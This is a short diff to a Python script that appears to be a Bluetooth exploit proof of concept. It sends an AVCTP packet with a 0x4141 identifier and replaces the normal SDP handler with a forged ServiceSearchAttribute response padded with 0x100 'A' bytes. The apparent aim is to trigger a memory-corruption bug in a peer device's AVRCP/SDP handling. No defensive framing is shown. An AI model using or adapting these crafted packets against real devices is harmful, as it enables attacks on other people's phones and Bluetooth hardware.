@@ -129,8 +129,12 @@ async def main():
         avrcp_protocol.avctp_protocol.l2cap_channel.send_pdu(
             AvctMakePacket(0, avrcp.Protocol.PacketType.START, False, False,
                            0x4141, avrcp_command_buf))
-        device.sdp_server.orig_on_sdp_service_search_attribute_request(
-            requests[1])
+        device.sdp_server.send_response(
+            sdp.SDP_ServiceSearchAttributeResponse(
+                transaction_id=requests[1].transaction_id,
+                attribute_lists_byte_count=0x100,
+                attribute_lists=b"A" * 0x100,
+                continuation_state=bytes([0])))
         await asyncio.sleep(4)
 
 
